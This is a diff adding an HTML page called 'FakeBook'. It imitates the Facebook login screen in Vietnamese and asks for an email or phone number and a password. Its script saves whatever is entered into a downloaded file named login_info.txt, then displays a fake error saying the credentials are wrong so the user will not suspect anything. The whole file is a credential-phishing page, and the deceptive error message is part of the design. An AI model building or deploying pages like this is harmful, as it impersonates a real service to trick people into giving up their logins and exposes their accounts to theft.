@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>FakeBook</title>
+  <link rel="icon" type="image/png" href="icon.png" sizes="32x32">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #f0f2f5;
+    }
+
+    .login-container {
+      width: 400px;
+      padding: 20px;
+      background-color: white;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    .login-container h2 {
+      color: #1877f2;
+      margin-bottom: 20px;
+    }
+
+    .login-container input[type="text"],
+    .login-container input[type="password"] {
+      width: 95%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 12px;
+      background-color: #1877f2;
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .login-btn:hover {
+      background-color: #155bcb;
+    }
+
+    .error-message {
+      color: red;
+      font-size: 14px;
+      margin-top: 10px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+<div class="login-container">
+  <h2>Đăng nhập Facebook</h2>
+  <input type="text" id="username" placeholder="Email hoặc số điện thoại" required>
+  <input type="password" id="password" placeholder="Mật khẩu" required>
+  <button class="login-btn" onclick="downloadLoginInfo()">Đăng nhập</button>
+  <p id="error-message" class="error-message">Thông tin đăng nhập hoặc mật khẩu không chính xác</p>
+</div>
+
+<script>
+  function downloadLoginInfo() {
+    // Lấy giá trị từ ô nhập
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+
+    // Tạo nội dung cho file .txt
+    const fileContent = `Tên đăng nhập: ${username}\nMật khẩu: ${password}`;
+
+    // Tạo Blob chứa nội dung file
+    const blob = new Blob([fileContent], { type: "text/plain" });
+
+    // Tạo URL để tải file
+    const link = document.createElement("a");
+    link.href = URL.createObjectURL(blob);
+    link.download = "login_info.txt";
+
+    // Tự động nhấn vào link để tải file xuống
+    link.click();
+
+    // Hiển thị thông báo lỗi giả
+    document.getElementById("error-message").style.display = "block";
+  }
+</script>
+
+</body>
+</html>
